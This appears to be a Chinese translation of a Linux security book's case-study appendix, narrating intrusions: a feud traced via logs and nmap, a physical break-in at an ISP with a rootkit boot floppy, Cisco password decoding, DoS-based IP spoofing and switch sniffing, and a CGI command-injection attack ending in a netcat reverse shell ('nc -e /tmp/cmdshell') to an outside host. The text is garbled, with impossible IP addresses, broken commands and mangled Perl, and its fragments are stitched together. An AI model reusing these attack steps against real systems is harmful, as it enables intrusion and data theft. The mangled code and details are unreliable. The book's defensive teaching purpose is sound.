276.72.99.55 - [21/Aug/2000:18:43:57 -0700] "GET /post.cgi HTTP/1.0" 200 10131

276.72.99.55 - [21/Aug/2000:18:46:33 -0700] "GET /post.cgi HTTP/1.0" 500 599
```

所以，Martin 来自 276.72.99.55。为了查看那台机器是什么，Clive 了一次 DNS 查询：

```
clive$ host 276.72.99.55

5.99.276.276.IN-ADDR.ARPA domain name proxy.example.com
```

看来 Martin 正在使用代理，而 276.72.99.55 根本不是 Martin 的机器。Clive 需要进一步挖掘，看看 Martin 的家用机器在哪里。他回看 Martin 拥有的旧邮件，发现了如下标头信息：

```
Return-Path: <martin@sardoit.com>

Received: from martin.sardoit.com (box1.martin.sardoit.com) [208.275.18.1]

by mail.email_list.org (8.101/8.9.3) with SMTP on e7MIEoo00555

for <list@mail_list.org>; Tue, 04 JAN 2000 11:54:05 -0800

From: "Martin Sardoit" <martin@sardoit.com>
```



To: "Clive Krahe" <clive@better_you.com>

Subject: You are an idiot

Date: 04 Jan 2000 13:27:21 -0600

在接收（Received）行中，Clive 看到了 `208.275.18.1` IP 地址，这很可能是 Martin 的真实机器。

```
clive$ host 208.275.18.1
1.18.275.208.IN-ADDR.ARPA domain name pointer box1.martin.sardoit.com
```

```
clive$ host box1.martin.sardoit.com
box1.martin_sardoit.com has address 208.275.18.1
box1.martin_sardoit.com is handled by (pri10) by mail.isp_central.net
```

Clive 使用 `nmap` 看看 Martin 正在使用什么样的机器：

```
clive$ nmap -O box1.martin.sardoit.com
Starting nmap V. 2.54BETA1 by fyodor@insecure.org (www://insecure.org/nmap/ )
Interesting ports on box1.martin.sardoit.com (208.275.18.1)
(The 1517 ports scanned but not shown are in state: closed)
Port Service
22/tcp ssh
25/tcp smtp
TCP Sequence Prediction: Class-random
Difficulty=396696
Remote system guess: Linux 2.122
Nmap run completed -- 1 IP address (1 host) scanned in 0 seconds
```

## 尝试登录

`nmap` 输出显示机器运行 Linux，提供 SSH 和邮件服务。Clive 尝试登录 Martin 的机器：

```
clive$ -v box1.martin.sardoit.com -l martin
Ssh Version OpenSSH-2.1, protocol 1.5/2.0.
Compiled with SSL (0x090581),
debug: Registering configuration data /home/clive/.ssh/config
debug: Registering configuration data /etc/ssh/ssh_config
debug: Applying options for *
debug: Seeding random generator
debug: ssh_connect: getuid 1500 getuid 0 anon 0
debug: Connecting to box1.martin.sardoit.com [208.275.18.1] port 22.
debug: Seeding random generator
debug: Allocated local port 617.
debug: Connection established.
ssh_exchange_identification: Connection closed by remote host
debug: Calling cleanup 0x80bcbc0 (0x0)
clive$
```

由于尝试登录之前就被断开了，Clive 推测 Martin 使用了 TCP 封装（wrappers）来限制哪些 IP 可以连接他的机器。知道密码毫无用，Clive 需要一台允许连接到 Martin 机器的机器。哪里最高？

## 寻找另一扇门

对 Martin 的域名进行 `whois` 查询返回：

```
clive$ whois MARTIN_SARDOIT.COM
Domain: SARDOIT.COM
Registrar: SOLUTIONS, INC.
URL: www.solutions.com
Name Server: NS1.CENTRAL.NET
Name Server: NS2.CENTRAL.NET
Updated: Jun 17 2000
```



从他的 `~/.bash_history` 看出，Clive 甚至一个命令都没用过。但为了安全起见，他将机器断开了网络连接，并遵循了他的入侵后处理程序，验证了所有关键文件的校验和，并确保 Clive 没有留下任何东西。

他知道 Clive 并不精通技术，对于被他如此轻易地攻破感到相当羞愧。在确认 Clive 没有造成任何破坏后，Martin 为留言板准备了他的下一轮“文字攻势”。

## 案例研究 B

本案例详细说明了一起由名为 Chad Durkee 的黑客对互联网服务提供商（ISP）发生的入侵事件。（此名字已更改。）他的目标是攻破他们网络上的一个主机，从该主机向其他系统发起攻击。这样做有几个吸引之处：

- 该 ISP 拥有多个连接互联网的冗余连接，这意味着 Chad 可以进行比他从家里拨号账户多得多的攻击和扫描。
- 该 ISP 有许多他怀疑认为安全性不高的客户，但他们都位于 ISP 提供的防火墙之后。
- Chad 在一个月前申请这家 ISP 的工作时曾被拒绝了。

### 锁定目标

发起攻击的第一步是尽可能多获取有关潜在受者的信息。我们已经展示了许多映射网络的电子方法，以查看可用种类的机器以及它们运行着哪些服务。

在这个案例中，Chad 不需要做这么多这类“功课”。他曾申请过这家 ISP 的工作，并在一个月前参加了面试。在面试期间，他们向他提了关于编程技能、系统管理经验和安全能力的许多问题。然而，面试中的信息流并非完全单向的，在面试过程中，Chad 能够收集到关于这家公司及其服务器和网络结构的大量信息。

这并非全是恶意。为了让潜在员工决定是否喜欢在某家公司工作，了解他们如何运作以及这是否与雇主的理念兼容至关重要。因此，面试中的双向信息流通常会让面试官产生警觉。

例如他们之间的以下对话：

面试官：那么，我看到你有 ACME 防火墙的经验。你对它们熟悉程度如何？

Chad：嗯，其实那些东西没什么用。可以做的配置很少；简单的 ACL 比路由器大不了差。不过，那是我上一家公司负担得起的唯一防火墙了。我个人曾主张使用运行 `ipchains` 的 Linux 机器，那不需要任何费用。你们在这里使用什么样的防火墙？

面试官：嗯，我们大多数防火墙都是 BrickWallTwoThousand，但在更敏感的网络周围，我们使用了 NuclearKnight 580。

Chad：太棒了！我一直想弄到一台 Knight，但我听说他们的操作系统 6.77 版本有一个问题，容易受到 PORT FTP 漏洞的攻击，这让我有点担心。

面试官：是的，但那个问题在发现几天后的下一个版本中就被修复了，我们立即进行了升级。

通过这段对话，面试官了解到 Chad 对他使用过的产品有良好的背景，并且对市场上的其他产品也有了解。然而，Chad 并没有能给面试官留下深刻印象，但也以一种不起眼的方式获取了关于网络和机器状态的内部信息。

面试还包括与更多技术人员和管理人员的讨论，包括对服务器房的参观，总而言之，Chad 获得了大量关于该 ISP 如何运营的信息。

事实证明，他的工作申请被拒绝了（显然申请者很多，而且工作经验更丰富）。尽管他在参观和面试期间并没有有意识地试图从 ISP 员工那里获取敏感信息，但他发现自己掌握了大量的零散知识。

### 映射网络

他对网络进行了一系列扫描，寻找他想要访问的机器。最令他感兴趣的机器是监控主机。从实地参观中了解到，它的唯一功能是验证 Web 服务器、FTP 服务器和数据库等服务是否在相应的机器上运行。这台机器必须与它所监控的所有机器都有网络连接。此外，这台机器与一个安全主机处于同一网络中，这可能非常有用。鉴于组织内防火墙的数量，这台机器很难通过网络到达，但如果他能进入它，那里将是一个金矿。

### 渗透

Chad 决定最佳方案是进入建筑并尝试物理访问该主机。他已经知道了建筑的布局，并且已经看到了正在使用的某些安全措施。

## 附录 D：案例研究

组织的外门由门卡控制，他知道自己几乎没有机会获得钥匙。但他认为跟着清洁人员溜进去相对容易。晚上，他在建筑外停车，发现他们晚上 8 点来。他们没有穿制服，但戴着看起来像胸章的东西。他们没有门卡，当他们叫门时，一位晚班员工（可能是二班班 NOC 的某些员工）让他们进了门。第二天，他去了他们的办公室并进入，跟着几个看起来刚下班的员工。他们带他来到一个存放工卡和胸章的房间。他找到一张几周没用过的卡（可能是某个正在休假或离职的员工），并找到了匹配的胸章。

他们在里面时他记录了他们的公司并写下了名字。第二天他去他们的办公室进入。第二天晚上，在清洁人员进入 15 分钟后，他自己响了门。他提着一个包和一个吸尘器（是从他们的卡车上拿的，他们没锁车），NOC 技术员以为他是去上班的。

### 进入服务器房

既然他已经离开了建筑，下一步是进入服务器房。门由门卡保护，但也有一把锁，可能是为了电子钥匙系统失效时应急用的。他从面试中知道我们的经理是谁，他们最可能持有房间的钥匙。

尽管办公室是开着的，但大多数抽屉（你最可能找到钥匙的地方）都锁着。少数没锁的抽屉里也没有匹配服务器房门的钥匙。然而，其中一个抽屉看起来匹配抽屉柜本身。他在其他办公室尝试，结果如其所料地打开了另一个系统管理员办公室的抽屉。里面有一把服务器房的钥匙。几乎太简单了。

### 突破监控主机

Chad 准备了许多自动化攻击和根内核，准备从互联网上的某台机器下载。他的意图是查看是否有人登录了机器（包括所有虚拟连接），如果是这样，就从他的服务器下载文件，并查看它能否获取 root 权限并隐藏他的踪迹。他在家里的测试通常可以在五分钟内完成这些。

然而，当他接近目标机器时，Chad 失望地发现它不再连接键盘或显示器。显然，自从面试以来，他们购买了控制服务器，现在的控制台访问现在通过串口端口连接终端服务器来实现。

这并没有大大减慢他的速度。他打开了随身携带的普通包，里面有他的笔记本电脑。他将终端电缆插入串口端口并与之连接。遗憾的是，他们没有让自己登录，因此他无法

# 522 破解 Linux 揭秘：Linux 安全秘密与解决方案

为了下载他的攻击脚本，他显然不想浪费时间尝试猜测密码。

他的包里还有一张他提前为解决这个问题准备的 3.5 英制磁盘。这是一张可以启动的 Linux 软盘，可以执行以下操作：

1. 引导软盘上启动一个精简的 Linux 内核。
2. 挂载硬盘文件系统。
3. 在机器上安装一些简易的自制 rootkit（根内核）。
4. 根据实际机器配置配置网络。
5. 从他可以访问互联网的主机下载更大的 rootkit。
6. 擦除软盘。
7. 将机器上的各种系统配置和安全文件拷贝到软盘中，以备日后使用。
8. 从硬盘重启系统。

假设他没有将 BIOS 设置为仅从硬盘启动，那么让这张磁盘运行会很容易。然而，这并不是最优雅的解决方案。他必须重启机器才能启动软盘。由于无法通过串口线触发 `CTRL-ALT-DEL`，他只是切换了电源按钮——虽然粗鲁但速度很快。他看着机器从软盘启动，访问了一会儿硬盘，看到交换机上出现短暂的网络流量，又访问了一会儿，机器再次开始重启。他拔出软盘，把它放入包里，淡定地离开了建筑（留下了他借来的真空机）。

# 调查被入侵的主机

Had 设计的 rootkit 旨在连接到他可以访问互联网的主机，允许他直接在被入侵的机器上以 root 身份输入命令。回到家后，看到连接成功他很高兴，确实可以以 root 身份做任何想做的事。通过此连接进行的任何操作都不会被记录，也不会通过标准的 `ps` / `w` / `top` 命令可见。他的 rootkit 安装成功了。

他实现了主要目标：获取 ISP 一台机器的访问权限，这样他在攻击其他机器时就可以隐藏踪迹。然而，没有理由检查该机器上的其他机器。如果他攻破该网络上的另一台机器，就能为发现的第一个承诺提供一些冗余。无论你是黑客还是管理员，了解你机器周围的环境都是一种良好的习惯。

他扫描了邻近的机器，发现大多数都运行着精简的服务——少数几个 Linux Web 服务器、一些 NT 机器和 Solaris 主机。

他向机器上传了各种嗅探软件，以便查看该机器所连接的网络上运行着什么。当他尝试嗅探时，只看到了广播包和目标为他 IP 地址的数据包。这台机器可能连接到一个交换机上，这意味着除非重新配置交换机将所有包发送给他，否则他无法做任何事情。他用 `nmap` 扫描了整个网络，发现确实有一台机器连接到一个 Cisco 交换机。然而，对其进行 `telnet` 的尝试立即被拒绝。

Chad 想重新配置交换机让它向他发送所有包。然而，交换机可能关联有密码，这意味着他必须劫持现有的连接。由于他怀疑没有人会长时间登录在交换机上（尤其是由于大多数人在注销后都有很短的超时时间），这需要巨大的耐心。

相反，他想到了某些面试问题。他接触过的管理员提到过环境变更中“变更控制”的重要性，即对任何机器所做的环境更改都保存在 csv 仓库或其他格式中。由于 Cisco 产品允许从 tftp 仓库进行读写，Chad 猜测管理员会对比 UNIX 主机上的文件进行更改，然后将它们上传到交换机。这实际上是一种非常常见的方法，Chad 自己在之前的工作也用过。

如果他能获取配置，他可能就能确定密码以及哪些主机被允许连接。在 `nmap` 扫描期间，他看到一台本地机器上运行着 `tftp` 服务器。他带了一长串可能的文件名（这些可能用于切换交换机配置），并尝试获取它们。



## TFTP 获取

`monhost` `tftp` `tftphost`

`tftp>` `get` `switch.cfg`

`tftp>` `get` `cisco.cfg`

`tftp>` `get` `cisco.net`

`tftp>` `get` `switch-a10-c95`

`tftp>` `get` `switch-a10-c95.config`

`tftp>` `get` `switch-a10-c95.boot`

获取文件后（发现机器名为 `192.1.295.2.cfg`，即该机器的 IP 地址），他注意到只有两个主机被允许连接到交换机。一个是安全主机，另一个部是 `192.1.295.15`。看到这个配置也让他很高兴：

```
hostname switch-a10-c95

!

enable password 7 120A321E454324

!

ip domain-name internal_net.the_isp.com
```

Cisco 提供多种密码加密选项。在这种情况下，他们使用了 "`password7`"，这并不是加密，仅仅是混淆。众周知你可以反转该算法，获取混淆字符串（"`120A321E454324`"）并确定实际密码。在这种情况下，密码是 `swI7(H)`。

# 破解 Linux 揭秘：Linux 安全秘密

这不是默认的 Cisco 配置。默认情况下，`enable password` 以 MD5 哈希值存储。管理员并没有认为这个交换机是敏感的，仅仅从另一台机器复制了密码。如果你使用 Cisco 产品，尽可能使用 `secret` 而不是 `password`。为了访问交换机，Chad 需要冒充两台机器之一。由于它们都在局域网内，他可以在自己的机器上别名该 IP 地址。然而，他想要冒充的真实机器可能会因为相同的 IP 地址而产生干扰。他必须做些什么来防止这种干扰发生。他的计划是拒绝服务机器，以便有足够的时间使用他的 IP 地址并更改交换机配置。然而，他相当确信，安全主机上的任何攻击都会触发警报。他不得不希望这台机器不会那么重要或那么安全。此时，他享受了正确选择目标的好处：监控主机包含了主机和端口数据库，每个都有详尽记录。根据记录，数据库提到了其他服务器，因此丢失其中一个可能不是问题。他修改了监控程序的配置，让它们完全不检查这个。他部署了一些工具来监控主机，并准备对时间服务器发动攻击。他看着 ping 响应变得越来越慢，直到它们停止。

```
monhost# ping -i 5 timeserver

PING timeerver (192.1.295.15) from 192.1.295.15: 56(84) bytes of data

64 bytes from 192.1.295.15: icmp_seq=0 ttl=115 time=8.9 ms

64 bytes from 192.1.295.15: icmp_seq=1 ttl=115 time=50.0 ms

64 bytes from 192.1.295.15: icmp_seq=2 ttl=115 time=552.8 ms

64 bytes from 192.1.295.15: icmp_seq=3 ttl=115 time=4423.2 ms

64 bytes from 192.1.295.15: icmp_seq=4 ttl=115 time=7726.0 ms

64 bytes from 192.1.295.15: icmp_seq=5 ttl=115 time=8758.7 ms
```

在有效处理时间服务器后，他设置了一个虚拟 IP 地址并使用 `netcat` 连接到交换机，这允许他指定所需的源 IP 地址。

```
monhost# ifconfig eth0:1 192.1.295.15 up

monhost# nc -s 192.1.295.15 switch-a10-c95 23

Password:

switch-a10-c95# conf t
```

# 附录 D：案例研究

```
switch-a10-c95# interface fastEthernet 0/1

svc-lan(config-if)#port monitor fastEthernet 0/1

svc-lan(config-if)#port monitor fastEthernet 0/2

svc-lan(config-if)#port monitor fastEthernet 0/32
```



你可能会奇怪，为什么我们要对一个没有运行 Linux 的系统提供如此详细的细节。除了“为什么不”这个简单答案外，我们认为记住黑客攻击并不是 Linux 特有的领域非常重要。上述交换机配置是黑客获取进一步渗透所需信息的必要步骤，即使这不涉及 Linux 系统。记住，你机器的安全不仅取决于它本身，还取决于它周围的系统。

此时，Chad 不再需要使用时间服务器的 IP 地址了，因此他关闭了拒绝服务工具并禁用了他的虚拟 IP 地址。大约五分钟后，时间服务器恢复并重新上线，他重新恢复了它的监控检查。

# 嗅探网络

现在 Chad 访问了所有网络流量，他能够看到网络上发生了什么，这为下一步如何攻击提供了更好的视角。

正如预料的那样，最引人入目的流量一些涉及安全主机。它会周期性地产生许多短寿命 ssh 连接，这些可能是定时任务（cron jobs），会连接到目标机器并运行随机进程、复制入出日志文件或其他活动。由于它们是加密的，它们并没有提供了解它们做了什么的机会，但了解安全人员感兴趣的内容总是很有用的。

安全主机还发了许多 ssh 会话。这些是短运行的周期性连接。它们大多数是简单的收集请求（运行如 `ps`、`vmstat`、`df` 等命令）。估计这些机器没有安装 ssh。它们中的大多数根本不是 UNIX 机器——对于 NFS 服务器是专用硬件。

这些并不是有用信息的唯一来源。安全主机从交换机、路由器以及一些支持 SNMP 的应用程序和服务器接收了大量的 SNMP 信息。Chad 发现，大多数使用嗅探连接的机器都没有安装任何 ACL，他能够利用嗅探连接直接联系服务器并收集 SNMP 结果，其中包含了操作系统、开放网络、运行进程和当前登录情况等信息。

可能是 Chad 嗅探到的最有用的服务器是 syslog 输出。显然，他的防火墙、路由器和入侵检测机器正在向安全服务器发送 syslog 输出。由于没有加密这些消息的方法，他能够看到所有的明文内容。

## 观察日志

记住，Chad 的主要目标是在该位置放置一台机器，通过这台机器黑入其他机器。然而，他不想暴露自己的行踪。许多攻击会触发防火墙或入侵检测机器的警报。由于他目前正在嗅探网络，他能够看到哪些活动被记录了，哪些没有。

于是，Chad 开始对一个已知的外部主机进行了一些非常缓慢的攻击扫描，并观察这些发送到安全主机的日志。他想建立一个可以在不触发任何警报的情况下使用的出站攻击列表。然而，他不希望这些攻击的源是监控主机，否则他的入侵行为就会被发现。相反，他创建了一个虚拟 IP 地址，其以太网地址与实际主机地址分离，这与他之前伪装时间服务器时做的事情类似。

他从虚假 IP 发送了所有出站攻击，还通过路由发送了一些伪造 IP 地址的攻击。结果证明，他的出站攻击没有触发多少警报。任何伪造外部 IP 地址的尝试都是失败的。数据包没有到达网络外部，入侵检测机器记录了该尝试。这就是使用虚假 IP 和以太网地址保护 Chad 免于被快速发现的地方。

他从外部对时间服务器运行了几次快速攻击，发现这些攻击会很快触发警报。因此，他相当确定他们对出站访问的监控程度不如对入站访问监控。这将是他向新机器发起攻击的绝佳主机。

## 停止嗅探

如果管理员恰好登录到交换机，而他的端口正在接收来自所有其他以太网端口的数据包，他们很可能会怀疑某些异常，并调查交换机和监控主机。因此，Chad 将交换机的配置恢复到之前的状态非常关重要。

这意味着他将无法再次嗅探网络，但隐藏行迹、不引起注意比拥有这种能力要重要得多。他在需要时可以再次开启它，但一直开启它太危险了。他保存了所有嗅探到的数据包以备后后分析。他能够确切检查哪些攻击会被记录，线路上还有哪些其他活动。

于是，他像以前一样登录到交换机：对时间服务器进行 DOS 攻击，借用它的 IP 地址，登录交换机，并撤销配置。

## 现在该去哪里？

尽管 Chad 从未尝试入侵安全主机，但他确实进入了一些相邻机器，包括几乎每一个 Web 服务器。一些 Web 服务器正在处理信用卡交易，他成功收集了 1200 个可用的信用卡号。他没有使用其中任何一个——他之前在尝试使用盗取的信用卡信息时曾因为没有处理好痕迹被抓过一次——但当这些信息坐在他的硬盘上时，他还是忍不住感到很强大。

他的出站攻击很大程度上是成功的。高带宽意味着更快的网络扫描，这意味着发现潜在漏洞主机的速度更快。从 ISP 的监控主机，他会找到运行有漏洞的软件，运行相应的攻击，安装几个自制的 rootkit，并从他其他几台受损的机器上访问它们。

Chad 成功使用了监控主机三个月而没有被发现。许多公司会声称这一点但并不会付诸行动；这家 ISP 做到了。在他们的一次例行审计中，当公司内部管理员和外部承包人员查看安全措施时，他们注意到他们没有监控出站攻击。当他们加入必要的规则来检查此类内容时，他们发现了 Chad 的出站攻击。

由于 Chad 无法在不嗅探的情况下查看 syslog 消息（他不愿意这样做以免尽早被发现），因此他不知道自己是什么时候做了这个更改。ISP 的管理员并不知道对于这次泄露具体该怎么办。尽管他们有例行审计，但他们没有提前制定好实际的安全策略和程序。因此，每个管理员轮流尝试查看是否能弄清楚监控主机发生了什么。

## 追逐

Chad 对系统的更改完全隐藏了他在监控主机上的进程、网络活动和文件，即使对 root 用户也是如此，因为他将更改直接编译在安装的内核模块和修改后的内核中。然而，在机器本身之外隐藏网络活动是不可能的。他想要发送的每个数据包仍然通过网络硬件——本地交换机、路由器、防火墙——以及管理员。

每当攻击来自监控主机时，管理员就会看到机器上运行的进程。当然，他们什么都没有看到，但 Chad 开始注意到登录次数比正常多，而且大多数登录都在运行类似 `top`、`ps` 和 `find /` 的命令，这些都可能表明他的攻击受到了怀疑。

与其继续冒被发现的风险，简单的解决方案是：离开。他删除了所有文件，关闭了到外部机器的出站连接，并停止以任何方式使用监控主机。他的行动结束后，管理员无迹可查。然而，Chad 仍然控制着大约 40 台新黑入的机器，分散在互联网各地。

## 离开，并非永恒

ISP 从未找到 Chad。自从那天注销后，他就没有再尝试使用那台机器，也没有看到任何他们已经追踪到他的迹象。显然，他们也没有发现他所做的所有更改。每个月的某一天，监控主机都会向互联网上的一个主机发送一条看似无害的回跳消息，其中包含详细说明其状态的代码信息。

# 附录 D：案例研究

# 揭秘破解 Linux：Linux 安全秘密与解决方案

### 案例 C

当 `nmap` 无法识别操作系统指纹并报告随机的 TCP 序列时，通常意味着机器位于防火墙之后。

#### 探测主机

对 `172.18.29.200` 开始 `nmap`：
主机在线（响应 0.004 秒）。
`nmap` 扫描报告 `172.18.29.200`
端口 状态 服务
25/tcp open  smtp
443/tcp open  https

`172.18.29.200` 的操作系统详情：
Linux 2.6.X - 5.x 已检测

TCP/IP 指纹 `172.18.29.200`：
难度：20
OS 窗口：512 (大小)，窗口：
TTL: 64,
缩放： 1 (无)

| 端口 | 状态 | 服务 |
| :--- | :--- | :--- |
| 25 | open | smtp |
| 443 | open | https |

#### 探测 Sendmail

远程攻击的可能性有限，因为机器只运行 SMTP 和 HTTPS。第一个逻辑选择是查看 25 端口在运行什么：

```
telnet www.example.org 25

尝试 172.18.29.200...

已连接 www.example.org

转义字符是 '^!'

220 www.example.org SMTP Sendmail 8.11.0/8.11.0;

vrfy root

252 无法验证用户；请使用 RCPT 尝试交付（或尝试 finger）

expn

502 歉，我们不允许执行此操作

MAIL

503 礼貌的人先说 HELO
```

看起来安装的 sendmail 版本是较新的，没有任何安全漏洞。（截至本书编写时，是。）此外，管理员配置的 sendmail 比默认安装更警惕，这体现在它拒绝运行 VRFY 和 EXPN 命令，并要求 HELO。可能针对该机器的任何 sendmail 攻击都会失败，但黑客仍然运行了一些针对旧有漏洞 sendmail 版本的脚本攻击，以防服务器被程序设置得比实际要新。

#### 探测 Web 服务器

Sendmail 是一个死胡同，黑客转向了运行中的 Web 服务器。第一步是验证它是否确实运行 HTTPS。他使用 Stelnel——一个公开可用的 SSL 包装器——就像他手动使用 telnet 连接到 80 端口并发送 HTTP 命令一样：

```
hackerbox# stunnel -D7 -f -c -r www.example.org.443

LOG5: Using 'www.example.org.443' as tcpwrapper service name

LOG7: RAND status claims sufficient for the PRNG
```



```
LOG6: PRNG seeded successfully

LOG5: stunnel 3.8p4 on 1686-pc-linux-gnu PTHREAD+LIBWRAP

LOG7: demo.swansystems.com.443 started

LOG7: demo.swansystems.com.443 connecting 172.18.29.200:443

LOG7: Remote host connected

LOG7: before/connect initialization

LOG7: before/connect initialization

LOG7: SSLv3 write client hello A

LOG7: SSLv3 read server hello A

LOG7: SSLv3 read server certificate A

LOG7: SSLv3 read server key exchange A

LOG7: SSLv3 read server done A

LOG7: SSLv3 write client key exchange A

LOG7: SSLv3 write cipher spec A

LOG7: SSLv3 write finished A

LOG7: SSLv3 flush data

LOG7: SSLv3 read finished A

LOG7: SSL negotiation finished successfully

LOG7: 1 items in the session cache

LOG7: 1 client connects (SSL_connect())

LOG7: 1 client connects that finished

LOG7: 0 client renegotiations requested

LOG7: 0 server connects (SSL_accept())

LOG7: 0 server connects that finished

LOG7: 0 server renegotiations requested

LOG7: 0 session cache hits

LOG7: 0 session cache misses

LOG7: 0 session timeouts

LOG7: SSL negotiation finished successfully

LOG6: www.example.org.443 opened with SSLv3,
cipher EDH-RSA-DES-SHA (128 bits)
```

```
HEAD / HTTP/1.0
HTTP/1.1 200 OK
Date: Wed, 19 Apr 2000 04:43:00 PDT
Server: Apache/1.3.1 (Unix) mod_ssl/2.6.6 OpenSSL/0.9.5
Last-Modified: Wed, 19 Apr 2000 04:43:00 PDT
ETag: "0"
Accept-Ranges: bytes
Content-Length: 0
Connection: close
Content-Type: text/html
```

所有的软件似乎都是最新版本（再次，截至本书出版时），且 Web 服务器（`Apache`）、其套件（`mod_ssl`）或构建构建的库（`OpenSSL`）都不存在安全问题。此外，SSL 协商到了全 128 位加密套件（`EDH-RSA-DES-CBC-SHA`）。所有迹象都表明这台机器配置良好。如果黑客想要进入这台机器，剩下的唯一工作就是检查机器上可用的 CGI，假设它们确实存在的话。

## 寻找 CGIs

首先，黑客运行了一个简单的程序来检查是否存在如 `php`、`test-cgi` 等具有已知漏洞的 CGI。系统中没有安装任何标准的漏洞 CGI。黑客是从一台他之前破解过的机器连接的，而不是从他自己的机器。检查是否存在漏洞 CGI 的 CGI 工具会被记录，任何系统管理员都会关注此类扫描。因此，在确定没有可以立即利用的 CGI 后，黑客需要检查该特定站特定的 CGI。尽管他可以使用标准的互联网搜索引擎搜索 `"cgi-bin site:www.example.org"` 来在他们的网页上翻找。结果返回了大约 20 条信息。

## 攻击 CGIs

结果之一似乎是一个简单的搜索页面，如图 D-1 所示。出于以下原因，它看起来是一个黑客攻击的好机会：

- 该 CGI 编写于 1996 年，当时不安全的 CGI 是常态。
- 列出的电子邮件地址是无效的。
- 该 CGI 没有链接到任何地方——事实上，有一个改进后的搜索 CGI 可用。这个 CGI 仅列在搜索引擎中。

需要查询我们员工之一的电子邮件地址吗？只需在下方字段中输入他们的姓名并点击提交。将立即显示匹配的条目。输入越通用，条目越多。这个 CGI 可能已经被遗忘很久，而且可能完全没有维护。这是一种相当常见的情况，通常会导致安全漏洞。黑客尝试了各种查询，结果如下：

| 查询 | 结果 |
|---|---|
| 像 "Bob" 这样的随机名称 | 成功的搜索结果。 |
| 空 | 显示“无此类员工”的节点页面。显示似乎是数据库中所有地址的节点页面。 |
| `%3b` | 在 HTML 结果页面内部，如图 D-2 所示，有以下输出：<br>Usage: grep [OPTION] ... PATTERN [FILE] ...<br>Try `grep --help` for more information.<br>sh: `/web/private/people`: Permission denied |

**图 D-1.** `query_email.cgi` 主界面

## 破解暴露的 Linux：Linux 秘密与解决方案

![](img/33829ffb1435bbaef56fcd28ec6cd_563_0.png)

**图 D-2.** 发送可疑 CGI 输入

## 附录 D：案例研究

书签跳转：`http://www.example.com/cgi-bin/query_email.cgi?name=`

## 搜索结果

下方是您查询 * 的匹配项。如果匹配项超过 20 个，可以点击页面底部的“下一页”按钮查看下 20 个匹配项。

```
Usage: grep [OPTION] PATTERN (FILE). grep --help for more information. sh: /tmp/folks: Permission denied
```

如果您还想进行不同的搜索，只需填写框并点击提交！

本网站由 ACME, Inc. 提供的服务。严禁滥用此处展示的任何数据，例如为了垃圾邮件目的收集电子邮件地址。

Copyright 1996, ACME, Inc.

# 破解 Linux 揭秘：Linux 安全秘密与解决方案

（此处省略其他无关处理内容）

```
unlink $filename, "/tmp/addpage.cgi.$"
```

看起来他似乎通过这个 CGI 上传了一个文件，但在 CGI 完成后它会被删除。他需要一种方法来阻止删除操作发生。

如果时机掌握得，他可以在 CGI 写入文件和删除文件之间将其杀掉。由于无法使用 `/bin/kill` 命令，他尝试通过 `addpage.cgi` 上传一个文件，同时通过不安全的 `query_email.cgi` 脚本运行以下命令：

```
perl -e 'kill 1, grep !/^\$\$/;; 2..65535'
```

注意：这个怪物级的命令会杀死除自身以外的所有进程。它并没有针对某个特定的进程。它虽然像大锤一样不优雅，但非常有效。

在尝试上传文件并杀掉 CGI 几次后，黑客确定需要多次尝试才能获得恰恰的时机。重新阅读文件后，他发现输出文件在打开时没有任何防止符号链接（symlink）攻击的保护。因此，他在 `/tmp` 目录下创建了一个符号链接的引导程序，指向 `/tmp/addfiles` 文件：

```perl
perl - mkdir "/tmp/upload"; for (2..65535)
symlink "/tmp/addpage.cgi.$" "/tmp/addpage.cgi.$\$"; '
```

目标是让它尝试打开 `/tmp/addpage.cgi.(进程ID)` 文件，而该文件实际上是指向 `/tmp/upload/gotcha.(进程ID)` 的链接。因此，当它删除 `/tmp/addpage.cgi.(进程ID)` 时，删除的是链接，而上传的文件将保留在 `/tmp/upload` 目录中供他使用。

# 创建持久连接

黑客在他的本地机器上编译了一个 `netcat` 副本，使用 `symlink-vulnerability-addpage.cgi` 程序将其上传，并利用了 `/tmp/upload` 目录：

```
--rw-r-- 1 noroot noroot 62836 Apr 19 04:43 /tmp/upload/gotcha.7726
```



他的意图是在 Web 服务器上设置一个 `netcat`，与他互联网上的机器通信，并运行他输入的任何命令，而不再需要使用 `query_email.cgi` 程序（该程序会记录了他的命令）。他写了以下 Perl 脚本：

```perl
#!/usr/bin/perl

open STDERR, ">STDOUT"; \$ENV{PATH}=":/tmp";

while (<>) { chop;

s/\\\\/ ? system($_) && print "$\n" : eval or print "@\n"

print "webserver";
```

# 附录 D：案例

这个程序是 Perl 在空间利用和模糊性方面的一个示例。第一个程序确保所有错误信息都发送到 `stdout`，并将 `/tmp` 目录（黑客存储其程序的地方）添加到 `PATH` 环境变量中。它继续读取输入行。如果行以 `$` 符号开头，则去掉该符号并由 `/bin/sh` 执行命令。如果不是以 `$` 开头，则命令被假设为 Perl 代码，并在 Perl 脚本中使用 `eval` 运行。无论使用哪种方法，任何错误代码都会输出。因此，黑客可以轻松地运行 Perl 或外部命令。

我们像之前上传 `netcat` 二进制文件一样上传了该 Perl 脚本——将它们复制到 `/tmp` 并使它们都具有可执行权限：

```
perl -e 'rename /tmp/uploaded/gotcha.7726", /tmp/nc"
rename /tmp/uploaded/gotcha.7782", /tmp/cmdshell"
chmod 0700, /tmp/nc", /tmp/cmdshell"
```

随后他在他的机器上运行了以下命令：

```
hackerbox# nc -vv -p 6666 205.285.79.99 -1
```

这在他的机器 `205.285.79.99` 的 `6666` 端口上设置了一个服务器，该服务器将监听连接并将他的键盘和屏幕与连接的远端连接。从这里他将输入命令，这些命令将由 `cmdshell` 执行，他在 Web 服务器上如下运行该程序：

```
nc -e /tmp/cmdshell 205.285.79.99 6666
```

# 防火墙干扰

黑客发现并没有如预期那样看到连接到他的 `netcat` 服务器，Web 服务器上的 `netcat` 客户端无法建立出连接。显然，Web 服务器前的防火墙不仅被设置为拒绝除特定端口外的指向 Web 服务器的连接，还被设置为只允许某些连接通过防火墙。该防火墙的配置非常偏执。

因此，黑客决定为 `netcat` 客户端尝试各种源/目的端口，使用常用端口如 lotus nodes、`cvpserver`、`squid`、`aol`、`cfengine`、`vnc`、Xil、irc、cucme、amanda 以及 `pcanywhere`。通过暴力测试（通过他上传的 Perl 脚本自动化），他发现如果他的源端口是 `8080`，他就能穿透防火墙——这是一个通常用于二级 Web 服务器的端口。也许在某时刻该机器上运行过额外的 Web 服务器，在服务器停用后该端口从未被关闭。

注意：尽管很有吸引力，但他无法使用任何低端口（`<1024`），因为 Web 服务器不是以 root 身份运行的，而绑定低端口需要 root 权限。

的确，机器上运行着一些从防火墙外部无法访问的服务。

## 攻击 FTP 服务器

